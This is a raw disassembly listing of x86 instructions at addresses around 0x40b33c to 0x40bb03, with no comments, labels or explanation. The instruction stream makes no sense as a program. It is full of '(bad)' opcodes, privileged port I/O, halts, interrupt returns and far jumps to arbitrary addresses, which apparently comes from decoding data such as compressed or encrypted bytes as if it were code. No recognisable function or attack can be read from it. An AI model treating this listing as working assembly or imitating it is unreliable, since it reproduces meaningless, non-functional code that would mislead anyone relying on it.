  40b33c:	bound  ebp,QWORD PTR [edi+0x2a8a9822]
  40b342:	inc    edx
  40b343:	sub    DWORD PTR [edx+0x2c9155ba],edi
  40b349:	pop    ecx
  40b34a:	jae    0x40b2fa
  40b34c:	retf   0x5e07
  40b34f:	pop    edx
  40b350:	xor    DWORD PTR [eax+0x159b9f41],esi
  40b356:	and    al,al
  40b358:	dec    esi
  40b359:	hlt    
  40b35a:	iret   
  40b35b:	call   0x5275:0x6e0f5a9
  40b362:	sahf   
  40b363:	xchg   esi,eax
  40b364:	mov    edi,0xb6f73345
  40b369:	mov    bl,0xb4
  40b36b:	mov    cl,0xc1
  40b36d:	adc    al,0x28
  40b36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b370:	add    BYTE PTR [esi-0x1b],cl
  40b373:	popf   
  40b374:	ror    al,cl
  40b376:	sub    dl,0x48
  40b379:	xor    eax,0xc20dccce
  40b37e:	out    0xe7,al
  40b380:	pop    ebx
  40b381:	stos   BYTE PTR es:[edi],al
  40b382:	push   0x4950340c
  40b387:	popf   
  40b388:	sbb    ebp,DWORD PTR [eax]
  40b38a:	pop    ecx
  40b38b:	inc    edi
  40b38c:	pop    ss
  40b38d:	or     ebp,DWORD PTR [edi+0x5a]
  40b390:	in     al,0x83
  40b392:	jno    0x40b3d6
  40b394:	xchg   esp,eax
  40b395:	jb     0x40b3df
  40b397:	jge    0x40b32c
  40b399:	mov    al,ds:0x16824cc
  40b39e:	jmp    0x4a64:0x86f39df
  40b3a5:	mov    dl,0xf6
  40b3a7:	pop    ss
  40b3a8:	jmp    0x7e26:0xd14ebe59
  40b3af:	jb     0x40b332
  40b3b1:	mov    esp,0x6ac4256e
  40b3b6:	dec    BYTE PTR [ebx+0x76]
  40b3b9:	pop    esp
  40b3ba:	addr16 mov al,bh
  40b3bd:	ror    BYTE PTR ds:0x88565e2e,cl
  40b3c3:	and    al,0xe4
  40b3c5:	fidivr DWORD PTR [ecx-0x6]
  40b3c8:	jbe    0x40b41b
  40b3ca:	les    esi,FWORD PTR [eax-0x55]
  40b3cd:	rcr    bl,1
  40b3cf:	or     bh,BYTE PTR [ebx+esi*1-0x27405cf7]
  40b3d6:	(bad)  
  40b3d7:	mov    esp,0xfd34d3af
  40b3dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3dd:	cmp    al,BYTE PTR [edi+0x65]
  40b3e0:	pop    ebp
  40b3e1:	mov    al,0xd1
  40b3e3:	inc    ecx
  40b3e4:	mov    BYTE PTR [eax-0x7541788a],0x94
  40b3eb:	scas   eax,DWORD PTR es:[edi]
  40b3ec:	cmc    
  40b3ed:	xchg   ebx,eax
  40b3ee:	sar    BYTE PTR [esi],0x56
  40b3f1:	out    0xe4,al
  40b3f3:	jg     0x40b3ab
  40b3f5:	sub    al,0x50
  40b3f7:	jecxz  0x40b3e4
  40b3f9:	inc    ecx
  40b3fa:	or     eax,ebp
  40b3fc:	and    BYTE PTR [ebx-0x33],ah
  40b3ff:	mov    ebp,DWORD PTR [ecx-0x58]
  40b402:	mov    BYTE PTR [esi],bh
  40b404:	and    eax,ebp
  40b406:	sub    ebp,DWORD PTR [edx]
  40b408:	or     al,0x6a
  40b40a:	inc    edi
  40b40b:	cmp    bl,BYTE PTR [edi+edi*4+0x4f]
  40b40f:	call   FWORD PTR [edi]
  40b411:	outs   dx,BYTE PTR ds:[esi]
  40b412:	out    dx,al
  40b413:	dec    ecx
  40b414:	cmp    ch,BYTE PTR [ecx-0x7ea98c4e]
  40b41a:	test   al,0x16
  40b41c:	jp     0x40b476
  40b41e:	test   BYTE PTR [edx-0x62c60074],ah
  40b424:	call   0x40cb89c9
  40b429:	leave  
  40b42a:	test   al,0x6a
  40b42c:	and    BYTE PTR [ecx+0x49560c6],dh
  40b432:	sar    edx,cl
  40b434:	and    DWORD PTR [esi+eax*1],esi
  40b437:	pop    eax
  40b438:	jmp    0x40b4a6
  40b43a:	inc    edi
  40b43b:	add    edi,DWORD PTR [edx-0x5f29cb9d]
  40b441:	and    al,0x30
  40b443:	shl    BYTE PTR ds:0xd934b886,cl
  40b449:	xchg   edi,eax
  40b44a:	gs dec ecx
  40b44c:	adc    eax,0xd03e9297
  40b451:	inc    ecx
  40b452:	(bad)  
  40b453:	xor    BYTE PTR [edi],bl
  40b455:	jecxz  0x40b491
  40b457:	fcomp  QWORD PTR [ecx]
  40b459:	jns    0x40b3f5
  40b45b:	bound  esi,QWORD PTR [esp+eax*4]
  40b45e:	test   al,0x9a
  40b460:	sbb    dh,BYTE PTR [edx-0x26]
  40b463:	arpl   WORD PTR [eax-0x4f83c7c5],sp
  40b469:	or     eax,0xc11d3af5
  40b46e:	inc    eax
  40b46f:	push   ds
  40b470:	ja     0x40b468
  40b472:	jbe    0x40b406
  40b474:	imul   eax,edx,0x231a8fe
  40b47a:	stc    
  40b47b:	jno    0x40b428
  40b47d:	jo     0x40b4a8
  40b47f:	icebp  
  40b480:	jecxz  0x40b48e
  40b482:	loopne 0x40b4c8
  40b484:	mov    cl,0xc0
  40b486:	pop    edx
  40b487:	fs or  eax,0x924e7dcc
  40b48d:	dec    ebx
  40b48e:	leave  
  40b48f:	sub    BYTE PTR ds:0x3855b76d,bh
  40b495:	inc    esp
  40b496:	aam    0x54
  40b498:	(bad)  
  40b499:	icebp  
  40b49a:	shl    BYTE PTR [eax],0x6d
  40b49d:	jp     0x40b49e
  40b49f:	outs   dx,DWORD PTR ds:[esi]
  40b4a0:	xor    DWORD PTR [ebp+0x8af808e],esi
  40b4a6:	pop    edx
  40b4a7:	adc    ebx,0x2a
  40b4aa:	mov    DWORD PTR [ebx-0x5],eax
  40b4ad:	push   ebx
  40b4ae:	fdiv   DWORD PTR [ecx+0x62d5de5e]
  40b4b4:	inc    eax
  40b4b5:	mov    bl,0xd3
  40b4b7:	cmp    DWORD PTR [eax+edi*1-0x2fa13761],0xffffffb7
  40b4bf:	popf   
  40b4c0:	mov    fs,WORD PTR [ebx]
  40b4c2:	repz adc DWORD PTR [ebx-0x2d31dff7],esi
  40b4c9:	cmp    al,0x30
  40b4cb:	imul   edi,DWORD PTR [edi],0x14840a98
  40b4d1:	or     BYTE PTR [ebx],0x15
  40b4d4:	lock aam 0xb3
  40b4d7:	jb     0x40b4fd
  40b4d9:	addr16 pop ebp
  40b4db:	adc    al,0x31
  40b4dd:	mov    edx,0x82d826f0
  40b4e2:	sbb    BYTE PTR [edx],ch
  40b4e4:	js     0x40b49f
  40b4e6:	dec    ecx
  40b4e7:	int    0xf9
  40b4e9:	daa    
  40b4ea:	hlt    
  40b4eb:	xor    eax,0x7f6908f0
  40b4f0:	adc    DWORD PTR [edx+0x42],ebx
  40b4f3:	pop    esp
  40b4f4:	push   0xcf1e84ce
  40b4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4fa:	xchg   edi,eax
  40b4fb:	call   0x2e84:0xee3d1c0a
  40b502:	shl    bh,1
  40b504:	inc    edi
  40b505:	cmp    ch,ah
  40b507:	or     BYTE PTR [edx-0x76],al
  40b50a:	adc    dh,ch
  40b50c:	(bad)  
  40b50d:	xchg   ebp,eax
  40b50e:	dec    ebx
  40b50f:	out    0x76,eax
  40b511:	jae    0x40b4bb
  40b513:	add    edi,ebp
  40b515:	and    al,0x3b
  40b517:	shl    DWORD PTR [edx-0xd],cl
  40b51a:	inc    edx
  40b51b:	rcl    DWORD PTR [ebx+0x74a86acd],0xde
  40b522:	test   BYTE PTR [ecx+0x57],dl
  40b525:	stc    
  40b526:	or     eax,0x2e97e84e
  40b52b:	inc    edi
  40b52c:	sbb    DWORD PTR [edi-0x1d46b302],eax
  40b532:	adc    eax,0x674389ff
  40b537:	and    BYTE PTR [esi+ebp*8+0x61],dl
  40b53b:	pop    es
  40b53c:	xor    DWORD PTR [eax-0x2205cfe9],edx
  40b542:	add    al,0x2b
  40b544:	xchg   esp,eax
  40b545:	(bad)  
  40b546:	push   0x2f592d2e
  40b54b:	mov    DWORD PTR [ecx+0xf55e57e],0x3c8022a9
  40b555:	pusha  
  40b556:	lock pusha 
  40b558:	push   ecx
  40b559:	shl    ebp,1
  40b55b:	or     ebx,edx
  40b55d:	push   edi
  40b55e:	mov    esi,0x1ee83b16
  40b563:	add    bl,BYTE PTR [ecx-0xb7a2563]
  40b569:	rcl    DWORD PTR [esi+0x712b083],1
  40b56f:	jbe    0x40b55c
  40b571:	inc    esi
  40b572:	das    
  40b573:	sub    dh,BYTE PTR [ebx-0x3a]
  40b576:	xor    al,0x28
  40b578:	call   0xb5aaa203
  40b57d:	xchg   ebp,eax
  40b57e:	sbb    dl,BYTE PTR [ecx+0x288b5228]
  40b584:	call   0x3031:0x78570d4a
  40b58b:	out    dx,eax
  40b58c:	pop    edx
  40b58d:	jg     0x40b5eb
  40b58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b590:	lds    esi,FWORD PTR [ebp*4-0x9c0b22d]
  40b597:	mov    eax,0xb583db17
  40b59c:	mov    esi,0xa1bafc06
  40b5a1:	out    dx,al
  40b5a2:	fisttp WORD PTR ds:0x6f3efd73
  40b5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5a9:	mov    al,ds:0xa01aeeba
  40b5ae:	mov    esp,0x4e90882d
  40b5b3:	and    DWORD PTR [ebp+eax*2+0x6b4d61be],edx
  40b5ba:	outs   dx,DWORD PTR ds:[esi]
  40b5bb:	scas   eax,DWORD PTR es:[edi]
  40b5bc:	mov    edi,0xf03bce50
  40b5c1:	mov    bl,0xed
  40b5c3:	pop    DWORD PTR [esi+ecx*1-0x60]
  40b5c7:	stc    
  40b5c8:	jecxz  0x40b5cc
  40b5ca:	mov    ch,0xc7
  40b5cc:	pop    edx
  40b5cd:	push   edx
  40b5ce:	out    dx,eax
  40b5cf:	(bad)
  40b5d2:	ror    BYTE PTR [esi-0x1e1736fa],0x97
  40b5d9:	sub    eax,0x1ac1d8cf
  40b5de:	call   FWORD PTR [edx+edi*4+0x7a]
  40b5e2:	retf   
  40b5e3:	test   bh,ah
  40b5e5:	adc    ebp,edx
  40b5e7:	cld    
  40b5e8:	out    dx,al
  40b5e9:	ja     0x40b5f8
  40b5eb:	ror    BYTE PTR [edx],cl
  40b5ed:	rol    eax,1
  40b5ef:	dec    edx
  40b5f0:	rol    BYTE PTR [edx+0x5a],1
  40b5f3:	mov    bl,0x6
  40b5f5:	data16 and al,0x6b
  40b5f8:	in     al,dx
  40b5f9:	ins    BYTE PTR es:[edi],dx
  40b5fa:	std    
  40b5fb:	mov    al,0x28
  40b5fd:	shl    bh,1
  40b5ff:	sbb    edi,DWORD PTR [esi]
  40b601:	mov    dh,0x4b
  40b603:	or     DWORD PTR [eax],ecx
  40b605:	pop    esp
  40b606:	adc    BYTE PTR [ebx+0x53],al
  40b609:	test   eax,0xb7fdc100
  40b60e:	fld    DWORD PTR [esi+0x11f0313b]
  40b614:	mov    ds:0x4dcd7131,al
  40b619:	mov    bh,0x8
  40b61b:	(bad)  
  40b61c:	adc    ch,BYTE PTR [ebp+0x63fc6234]
  40b622:	add    ebp,DWORD PTR [esi]
  40b624:	sbb    edi,DWORD PTR [edx+0x77]
  40b627:	rol    DWORD PTR [ebp+0x24a01ea0],0xb5
  40b62e:	mov    dh,0x77
  40b630:	fsubr  QWORD PTR [edi]
  40b632:	shl    BYTE PTR [esi-0x50],cl
  40b635:	retf   
  40b636:	das    
  40b637:	push   ds
  40b638:	pop    edx
  40b639:	mov    ch,0xb8
  40b63b:	stos   DWORD PTR es:[edi],eax
  40b63c:	scas   eax,DWORD PTR es:[edi]
  40b63d:	pop    ds
  40b63e:	pushf  
  40b63f:	xchg   DWORD PTR [edx+0x25],ebp
  40b642:	cld    
  40b643:	cld    
  40b644:	into   
  40b645:	cmp    DWORD PTR [ebp+0x3dfc4962],esi
  40b64b:	mov    al,0xb7
  40b64d:	call   0xb2645b94
  40b652:	lea    ebp,[ebp+0x2bebe871]
  40b658:	adc    edx,0x5245a4ca
  40b65e:	jecxz  0x40b647
  40b660:	push   ebx
  40b661:	gs mov dh,0x87
  40b664:	xor    dh,BYTE PTR [eax-0x9]
  40b667:	les    ecx,FWORD PTR [edi-0x2b622a24]
  40b66d:	inc    edx
  40b66e:	aas    
  40b66f:	adc    ch,BYTE PTR [ebx+0x4a]
  40b672:	sbb    esi,esp
  40b674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b675:	fisub  WORD PTR [ecx]
  40b677:	xor    DWORD PTR ds:0xa16ef294,esi
  40b67d:	xchg   ebx,eax
  40b67e:	aam    0x7b
  40b680:	sub    DWORD PTR [edi-0x5f],esi
  40b683:	daa    
  40b684:	pop    DWORD PTR [ecx]
  40b686:	idiv   esi
  40b688:	or     esp,DWORD PTR [edi-0x21129a48]
  40b68e:	neg    DWORD PTR [edi+eax*1+0x15]
  40b692:	mov    dh,0x61
  40b694:	jge    0x40b63c
  40b696:	mov    bh,0xe2
  40b698:	mov    ah,0x77
  40b69a:	or     al,0xc6
  40b69c:	ficomp WORD PTR [ebx-0x3331b789]
  40b6a2:	sub    cl,bl
  40b6a4:	push   ss
  40b6a5:	test   eax,0xbf050721
  40b6aa:	dec    ebp
  40b6ab:	xchg   esi,eax
  40b6ac:	pop    edi
  40b6ad:	popf   
  40b6ae:	jmp    0x2a1f4c61
  40b6b3:	adc    ebp,ebx
  40b6b5:	aaa    
  40b6b6:	pop    ebx
  40b6b7:	aas    
  40b6b8:	mov    DWORD PTR [edx+eax*8],edx
  40b6bb:	mov    eax,ds:0x78edd05a
  40b6c0:	sbb    BYTE PTR [ecx],cl
  40b6c2:	(bad)  
  40b6c4:	sbb    DWORD PTR [edx+esi*2+0x35],edi
  40b6c8:	aas    
  40b6c9:	fstp   DWORD PTR [esi-0x2]
  40b6cc:	jge    0x40b6dd
  40b6ce:	inc    eax
  40b6cf:	std    
  40b6d0:	or     edx,DWORD PTR [ecx+0x53]
  40b6d3:	jns    0x40b742
  40b6d5:	jae    0x40b722
  40b6d7:	xchg   BYTE PTR [esi-0x67d71197],al
  40b6dd:	jbe    0x40b6b5
  40b6df:	sub    bh,dh
  40b6e1:	mul    BYTE PTR [ebx+0x1c23349b]
  40b6e7:	icebp  
  40b6e8:	jb     0x40b743
  40b6ea:	test   BYTE PTR [edi],dl
  40b6ec:	popa   
  40b6ed:	es mov edx,0x190ceb56
  40b6f3:	and    DWORD PTR [esi-0x227c111e],0xfffffffc
  40b6fa:	js     0x40b690
  40b6fc:	cmp    bl,0xb1
  40b6ff:	pop    ebx
  40b700:	in     al,0x16
  40b702:	icebp  
  40b703:	inc    esp
  40b704:	add    eax,0xf0734074
  40b709:	test   eax,0xf1b7496f
  40b70e:	adc    ebp,DWORD PTR [edx]
  40b710:	je     0x40b768
  40b712:	adc    eax,0x187f4b9f
  40b717:	rcr    bh,1
  40b719:	mov    DWORD PTR [ebx-0x1c],edi
  40b71c:	xchg   edx,eax
  40b71d:	cmp    DWORD PTR [ebx-0x1e],ebp
  40b720:	cmc    
  40b721:	test   DWORD PTR [esi+0x6d],edx
  40b724:	stos   DWORD PTR es:[edi],eax
  40b725:	inc    ecx
  40b726:	mov    bh,0xa6
  40b728:	sub    BYTE PTR [edx-0xc0fc764],0x7f
  40b72f:	xor    eax,0xa17abc3a
  40b734:	jnp    0x40b74c
  40b736:	aam    0xd0
  40b738:	leave  
  40b739:	hlt    
  40b73a:	push   ebp
  40b73b:	cmp    BYTE PTR [edi-0x5887e0aa],cl
  40b741:	push   ss
  40b742:	mov    bl,0xf4
  40b744:	daa    
  40b745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b746:	xor    eax,0xb41992d7
  40b74b:	cmc    
  40b74c:	imul   ecx,DWORD PTR [ebp-0x19],0xffffffc1
  40b750:	sahf   
  40b751:	or     eax,0x1a46a756
  40b756:	inc    ebx
  40b757:	pop    ebp
  40b758:	vcvtpd2ps xmm0,XMMWORD PTR [esi]
  40b75c:	shl    BYTE PTR [ecx+0x70],1
  40b75f:	pop    es
  40b760:	in     eax,dx
  40b761:	or     al,0x43
  40b763:	rol    BYTE PTR [ebx-0xa34258],cl
  40b769:	cwde   
  40b76a:	cli    
  40b76b:	mov    ds:0x8c86bbe5,eax
  40b770:	in     eax,dx
  40b771:	mov    edx,esi
  40b773:	inc    edx
  40b774:	dec    edi
  40b775:	xchg   esi,eax
  40b776:	into   
  40b777:	and    eax,0x4951f84a
  40b77c:	retf   0xef0e
  40b77f:	mov    ds:0x3414e2d0,eax
  40b784:	mov    dh,0x8b
  40b786:	or     DWORD PTR [eax-0x71],ebp
  40b789:	inc    edx
  40b78a:	ss fldpi 
  40b78d:	outs   dx,BYTE PTR ds:[esi]
  40b78e:	mov    bl,0xe
  40b790:	lock je 0x40b757
  40b793:	sub    al,0x83
  40b795:	arpl   WORD PTR [ecx-0x509f6102],bx
  40b79b:	adc    eax,0x8c57fc54
  40b7a0:	xor    eax,edi
  40b7a2:	push   ebx
  40b7a3:	jg     0x40b788
  40b7a5:	lock push cs
  40b7a7:	cdq    
  40b7a8:	mov    edx,0xcdb57035
  40b7ad:	scas   eax,DWORD PTR es:[edi]
  40b7ae:	jbe    0x40b780
  40b7b0:	adc    ch,BYTE PTR [eax+0x167f2b0c]
  40b7b6:	mov    esi,0xfd3cb3c
  40b7bb:	lds    eax,FWORD PTR es:[edx-0x67]
  40b7bf:	mov    esp,0xfad12052
  40b7c4:	mov    al,0xe6
  40b7c6:	push   es
  40b7c7:	mov    ebx,0x3a0c594b
  40b7cc:	inc    edi
  40b7cd:	xlat   BYTE PTR ds:[ebx]
  40b7ce:	in     eax,0x2f
  40b7d0:	and    cl,dh
  40b7d2:	loopne 0x40b809
  40b7d4:	es (bad) 
  40b7d6:	cld    
  40b7d7:	inc    ecx
  40b7d8:	cld    
  40b7d9:	ins    DWORD PTR es:[edi],dx
  40b7da:	jmp    DWORD PTR [eax]
  40b7dc:	ss icebp 
  40b7de:	fcomp  DWORD PTR [esi+0x2226c449]
  40b7e4:	sub    BYTE PTR [ebp+0x5],0x6b
  40b7e8:	gs cdq 
  40b7ea:	pop    ss
  40b7eb:	mov    ecx,0x51e373ac
  40b7f0:	ins    BYTE PTR es:[edi],dx
  40b7f1:	loop   0x40b808
  40b7f3:	push   ss
  40b7f4:	fstp   TBYTE PTR [eax]
  40b7f6:	cmc    
  40b7f7:	test   BYTE PTR [edi],0xf2
  40b7fa:	jecxz  0x40b790
  40b7fc:	mov    cl,cl
  40b7fe:	pusha  
  40b7ff:	gs cli 
  40b801:	shl    DWORD PTR [ebx-0x63291aef],1
  40b807:	loopne 0x40b7b0
  40b809:	lods   al,BYTE PTR ds:[esi]
  40b80a:	es jmp 0x2184:0xe0ab7b91
  40b812:	adc    eax,0xab66f16d
  40b817:	push   ss
  40b818:	cld    
  40b819:	sub    eax,0xe6e28375
  40b81e:	dec    ecx
  40b81f:	bound  edx,QWORD PTR [ebx+0x585a69b5]
  40b825:	fidiv  DWORD PTR [edi-0x70215cb3]
  40b82b:	ror    eax,cl
  40b82d:	inc    ecx
  40b82e:	dec    ebp
  40b82f:	bound  ecx,QWORD PTR [ecx-0x608c2cd5]
  40b835:	mov    al,ds:0xc5ce738b
  40b83a:	ficomp WORD PTR [ebx]
  40b83c:	loope  0x40b7d9
  40b83e:	xchg   esi,eax
  40b83f:	rcr    ebx,1
  40b841:	(bad)
  40b844:	repnz lock cmc 
  40b847:	dec    esp
  40b848:	xor    DWORD PTR [ebp-0xa],0xcc484fa9
  40b84f:	leave  
  40b850:	daa    
  40b851:	inc    edi
  40b852:	or     ebx,DWORD PTR [ebp+0x313a99f4]
  40b858:	mov    cl,cl
  40b85a:	sbb    eax,0xb2978332
  40b85f:	mov    dh,0xf9
  40b861:	cmp    ecx,DWORD PTR [edi]
  40b863:	out    0xdb,eax
  40b865:	and    al,0x2d
  40b867:	pop    es
  40b868:	or     BYTE PTR [ebx],dh
  40b86a:	outs   dx,BYTE PTR ds:[esi]
  40b86b:	push   es
  40b86c:	lea    ebx,ds:0x32a5a84e
  40b872:	mul    BYTE PTR [ecx]
  40b874:	xchg   ebx,eax
  40b875:	fsubr  st(6),st
  40b877:	mov    WORD PTR [edi+eax*1+0x61984dec],es
  40b87e:	jbe    0xbe605476
  40b884:	jno    0x40b829
  40b886:	lods   eax,DWORD PTR ds:[esi]
  40b887:	push   ds
  40b888:	mov    dh,0x76
  40b88a:	xchg   DWORD PTR [eax+0x790cd995],edx
  40b890:	mov    al,ds:0xd19e2c02
  40b895:	mov    esp,0x432323b4
  40b89a:	test   BYTE PTR [eax],dl
  40b89c:	test   dl,ah
  40b89e:	int    0xaa
  40b8a0:	pop    es
  40b8a1:	cmp    eax,0x9a4762bc
  40b8a6:	inc    edx
  40b8a7:	xor    cl,al
  40b8a9:	pop    ecx
  40b8aa:	in     eax,0xb0
  40b8ac:	retf   0xf441
  40b8af:	pop    esp
  40b8b0:	add    eax,0xf64ac550
  40b8b5:	sbb    BYTE PTR [ebx+ebx*8],0x89
  40b8b9:	mov    al,ds:0xadbbfc89
  40b8be:	push   edi
  40b8bf:	int    0xe8
  40b8c1:	pop    edx
  40b8c2:	push   edi
  40b8c3:	(bad)  
  40b8c4:	stc    
  40b8c5:	enter  0xac44,0x10
  40b8c9:	or     BYTE PTR [ebp+ebx*4-0x3f078381],al
  40b8d0:	repz push 0x4985499d
  40b8d6:	bts    DWORD PTR [esi+0x55227c5f],eax
  40b8dd:	imul   BYTE PTR [ebx]
  40b8df:	je     0x40b916
  40b8e1:	xor    DWORD PTR [edx],edi
  40b8e3:	mov    ecx,0xe87f6bc2
  40b8e8:	mov    ds:0x36e74de,al
  40b8ed:	bound  esi,QWORD PTR [ebx-0x509b968e]
  40b8f3:	mov    BYTE PTR [ecx+0x3a6bc567],bh
  40b8f9:	dec    edx
  40b8fa:	ret    
  40b8fb:	cmp    eax,0x49788724
  40b900:	loopne 0x40b915
  40b902:	ror    BYTE PTR [esi-0x18],1
  40b905:	test   bh,0xe8
  40b908:	addr16 push esi
  40b90a:	mov    eax,0xfd1044f6
  40b90f:	sub    DWORD PTR [ecx+0x51115549],esi
  40b915:	mov    dh,0xef
  40b917:	or     ch,dh
  40b919:	pop    ds
  40b91a:	data16 (bad) 
  40b91c:	ror    edi,1
  40b91e:	fwait
  40b91f:	gs scas eax,DWORD PTR es:[edi]
  40b921:	sbb    ch,bl
  40b923:	mov    edi,0x2ef505c5
  40b928:	inc    edx
  40b929:	jo     0x40b997
  40b92b:	test   BYTE PTR [ebx+0x1b],dl
  40b92e:	fsub   DWORD PTR [esp+edx*4-0x69]
  40b932:	scas   eax,DWORD PTR es:[edi]
  40b933:	sti    
  40b934:	mov    eax,ds:0xaa577518
  40b939:	js     0x40b911
  40b93b:	out    0x17,eax
  40b93d:	outs   dx,BYTE PTR ds:[esi]
  40b93e:	sbb    eax,0xe1073ae3
  40b943:	xchg   bl,ah
  40b945:	jno    0x40b912
  40b947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b948:	sbb    BYTE PTR [esi-0x27],ah
  40b94b:	inc    esp
  40b94c:	xchg   ebx,eax
  40b94d:	or     al,0x76
  40b94f:	repnz pop edi
  40b951:	and    ah,BYTE PTR [ecx-0x345a9350]
  40b957:	and    ah,BYTE PTR [esi+0x20ef8435]
  40b95d:	cs das 
  40b95f:	enter  0x6868,0x46
  40b963:	daa    
  40b964:	xchg   DWORD PTR [esi+0x36],esp
  40b967:	(bad)  
  40b969:	mov    ecx,0x8d4183b3
  40b96e:	(bad)
  40b972:	bound  edi,QWORD PTR [esi-0x3c26adfb]
  40b978:	xchg   BYTE PTR [ebp-0x42],dh
  40b97b:	test   DWORD PTR [edx-0x764d2354],edi
  40b981:	int    0xbb
  40b983:	jo     0x40b955
  40b985:	jbe    0x40b91f
  40b987:	or     bl,BYTE PTR [eax-0xf]
  40b98a:	push   edi
  40b98b:	pop    edx
  40b98c:	dec    esp
  40b98d:	scas   eax,DWORD PTR es:[edi]
  40b98e:	leave  
  40b98f:	inc    eax
  40b990:	scas   al,BYTE PTR es:[edi]
  40b991:	imul   ecx,edi,0x4b
  40b994:	xor    al,0xae
  40b997:	loop   0x40b970
  40b999:	dec    esi
  40b99a:	add    DWORD PTR [edx+0x38eb43a],esi
  40b9a0:	dec    eax
  40b9a1:	outs   dx,BYTE PTR ds:[esi]
  40b9a2:	mov    dh,0xd
  40b9a4:	pop    ss
  40b9a5:	fnop   
  40b9a7:	sbb    BYTE PTR [ebx+ecx*2-0x1],ah
  40b9ab:	call   0x41cb:0x66cb5879
  40b9b2:	add    eax,DWORD PTR [eax-0x75]
  40b9b5:	call   0xdeaf9fd3
  40b9ba:	sbb    BYTE PTR [eax+0x716ad048],ch
  40b9c0:	and    DWORD PTR [ebp+0x60],esp
  40b9c3:	ins    DWORD PTR es:[edi],dx
  40b9c4:	mov    ebp,0x60188f2a
  40b9c9:	imul   esp,DWORD PTR [edi-0x2054d56],0xfffffff8
  40b9d0:	mov    esp,ecx
  40b9d2:	shr    BYTE PTR [edx+0x24cb6a3d],cl
  40b9d8:	xor    al,0x36
  40b9db:	in     eax,0x8d
  40b9dd:	mov    edx,0xf79e99ee
  40b9e2:	in     eax,0x4a
  40b9e4:	fmul   st,st(2)
  40b9e6:	stos   DWORD PTR es:[edi],eax
  40b9e7:	and    DWORD PTR [esi+0x63],ecx
  40b9ea:	out    dx,al
  40b9eb:	adc    BYTE PTR [ebx+0x3f0b2d69],ch
  40b9f1:	popa   
  40b9f2:	sbb    cl,0x9b
  40b9f5:	adc    DWORD PTR [edi-0x484988c6],ebp
  40b9fb:	jl     0x40b9e3
  40b9fd:	test   eax,0x3cb22a49
  40ba02:	lods   al,BYTE PTR ds:[esi]
  40ba03:	aad    0x49
  40ba05:	mov    ecx,0x14980528
  40ba0a:	rcr    DWORD PTR [ecx-0xeadcd27],cl
  40ba10:	(bad)  
  40ba11:	sbb    al,0x7e
  40ba13:	jns    0x40ba38
  40ba15:	stc    
  40ba16:	jmp    0x6462eaa0
  40ba1b:	xchg   ecx,eax
  40ba1c:	add    DWORD PTR [esi+ebp*8-0x3d],eax
  40ba20:	out    0xa3,eax
  40ba22:	push   esp
  40ba23:	adc    DWORD PTR [esi+0x69],esp
  40ba26:	fcmovnb st,st(4)
  40ba28:	ret    
  40ba29:	imul   eax,DWORD PTR [ecx],0x3d255460
  40ba2f:	xchg   edx,eax
  40ba30:	dec    edx
  40ba31:	pushf  
  40ba32:	in     eax,dx
  40ba33:	lock sub BYTE PTR [edi+edi*8],bl
  40ba37:	mov    ds:0xd4473ee4,eax
  40ba3c:	pop    ebx
  40ba3d:	hlt    
  40ba3e:	sbb    DWORD PTR [eax+0x6b],ebx
  40ba41:	mov    gs,WORD PTR [eax]
  40ba43:	stos   DWORD PTR es:[edi],eax
  40ba44:	mov    ebp,0x63e7f92a
  40ba49:	gs mov ch,0xda
  40ba4c:	pop    ss
  40ba4d:	call   FWORD PTR gs:[ecx+0x7369c2b]
  40ba54:	cld    
  40ba55:	sub    eax,0xc6896227
  40ba5a:	pop    ecx
  40ba5c:	pushf  
  40ba5d:	jns    0x40ba83
  40ba5f:	push   edx
  40ba60:	xchg   ebp,eax
  40ba61:	mov    DWORD PTR [ecx-0x7f],eax
  40ba64:	dec    esi
  40ba65:	mov    esi,0x54eb50e9
  40ba6a:	mov    dl,0x3
  40ba6c:	lods   al,BYTE PTR ds:[esi]
  40ba6d:	cdq    
  40ba6e:	sbb    BYTE PTR [edx+0x2e485321],dl
  40ba74:	test   al,0x45
  40ba76:	inc    esp
  40ba77:	lds    ebp,FWORD PTR [esi]
  40ba79:	push   0x71
  40ba7b:	imul   ebp,DWORD PTR [ebx],0x1a0c404d
  40ba81:	popa   
  40ba82:	gs xchg esp,eax
  40ba84:	test   eax,0x3cf4d74d
  40ba89:	mov    WORD PTR [eax+0x4e9b1699],cs
  40ba8f:	daa    
  40ba90:	fidivr DWORD PTR [ecx+eiz*8]
  40ba93:	rcr    ch,1
  40ba95:	sbb    esi,esp
  40ba97:	out    dx,al
  40ba98:	xor    al,0x38
  40ba9a:	aas    
  40ba9b:	bound  ebp,QWORD PTR [edx-0x28]
  40ba9e:	nop
  40ba9f:	push   esp
  40baa0:	mov    ecx,DWORD PTR [eax-0x48516a71]
  40baa6:	mov    bl,0x13
  40baa8:	scas   al,BYTE PTR es:[edi]
  40baa9:	aad    0x37
  40baab:	adc    esi,ebp
  40baad:	aas    
  40baae:	ror    DWORD PTR [edx+0x3cce44a],cl
  40bab4:	ss ins BYTE PTR es:[edi],dx
  40bab6:	dec    eax
  40bab7:	out    0xdf,eax
  40bab9:	mov    edi,0xb8c72d94
  40babe:	xchg   edi,eax
  40babf:	hlt    
  40bac0:	mov    esi,0x1b02b55b
  40bac5:	imul   ebx,DWORD PTR [ecx],0x5e
  40bac8:	xor    BYTE PTR [edi-0x5e1dffeb],dl
  40bace:	sbb    al,0x76
  40bad0:	jl     0x40bb08
  40bad2:	and    DWORD PTR [ecx+0x79bae132],0xc2de6245
  40badc:	das    
  40badd:	or     DWORD PTR [ebx-0xe],ebx
  40bae0:	mov    ebp,0xfb43e80
  40bae5:	inc    ecx
  40bae6:	mov    bl,0x94
  40bae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bae9:	call   0xc010:0x5c62735a
  40baf0:	mov    bh,0xce
  40baf2:	inc    eax
  40baf3:	xor    al,0xc6
  40baf5:	mov    esi,0xaf81cc4c
  40bafa:	push   0x2d
  40bafc:	aam    0xec
  40bafe:	in     al,dx
  40baff:	lea    ecx,[ecx]
  40bb01:	daa    
  40bb02:	std    
  40bb03:	dec    edx
